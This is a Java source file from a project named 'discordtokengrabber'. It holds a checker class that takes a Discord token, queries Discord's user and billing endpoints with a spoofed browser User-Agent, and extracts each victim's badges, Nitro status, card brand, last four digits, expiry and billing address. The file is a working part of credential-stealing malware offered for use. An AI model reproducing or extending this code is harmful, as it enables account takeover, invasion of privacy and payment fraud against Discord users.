package com.github.dedinc.discordtokengrabber.utils;

import com.github.dedinc.discordtokengrabber.objects.Address;
import com.github.dedinc.discordtokengrabber.objects.Account;
import com.github.dedinc.discordtokengrabber.objects.Payment;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

public class Checker {
    private HashMap<Integer, String> badgesMap = new HashMap<>() {
        {
            put(4194304, "Active_Developer");
            put(131072, "Early_Verified_Bot_Developer");
            put(16384, "Bug_Hunter_Level_2");
            put(512, "Early_Supporter");
            put(256, "House_Balance");
            put(128, "House_Brilliance");
            put(64, "House_Bravery");
            put(8, "Bug_Hunter_Level_1");
            put(4, "HypeSquad_Events");
            put(2, "Partnered_Server_Owner");
            put(1, "Discord_Employee");
        }
    };

    public List<String> getBadgesFromFlags(int flags) {
        List<String> badges = new ArrayList<>();
        for (Map.Entry<Integer, String> badge : badgesMap.entrySet()) {
            if (flags != 0) {
                badges.add(badge.getValue());
                flags %= badge.getKey();
            }
        }
        return badges;
    }

    public List<Payment> getPaymentsFromArray(JSONArray paymentsArray) {
        List<Payment> payments = new ArrayList<>();
        for (Object object : paymentsArray) {
            JSONObject payment = new JSONObject(object.toString());
            if (!payment.getBoolean("invalid")) {
                payments.add(new Payment(payment.getString("brand"),
                        payment.getString("last_4"),
                        payment.getString("country"),
                        payment.getInt("expires_month"),
                        payment.getInt("expires_year"),
                        getAddressFromObject(payment.getJSONObject("billing_address")),
                        payment.getBoolean("default")));
            }
        }
        return payments;
    }

    private Address getAddressFromObject(JSONObject addressObject) {
        String lineTwo = "null";
        try {
            addressObject.getString("line_2");
        } catch (Exception ignored) {}
        return new Address(
                addressObject.getString("name"),
                addressObject.getString("line_1"),
                lineTwo,
                addressObject.getString("city"),
                addressObject.getString("state"),
                addressObject.getString("country"),
                addressObject.getString("postal_code")
        );
    }

    public String getNitroByType(int premium) {
        String nitro = "Not";
        if (premium == 1) {
            nitro = "Classic";
        } else if (premium == 2) {
            nitro = "Boost";
        } else if (premium == 3) {
            nitro = "Basic";
        }
        return nitro;
    }

    public Account check(String token) {
        try {
            URL url = new URL("https://discord.com/api/v6/users/@me");
            HttpURLConnection connection = getConnection(url, token);

            int responseCode = connection.getResponseCode();

            if (responseCode == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder content = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }

                reader.close();

                String contentAsString = content.toString();
                JSONObject user = new JSONObject(contentAsString);
                url = new URL("https://discord.com/api/v6/users/@me/billing/payment-sources");
                connection = getConnection(url, token);

                responseCode = connection.getResponseCode();

                if (responseCode == 200) {
                    reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    content = new StringBuilder();

                    while ((line = reader.readLine()) != null) {
                        content.append(line);
                    }

                    reader.close();

                    contentAsString = content.toString();
                    JSONArray payment = new JSONArray(contentAsString);
                    return Account.parse(token, user, payment);
                }
            }

            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private HttpURLConnection getConnection(URL url, String token) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Authorization", token);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        return connection;
    }
}
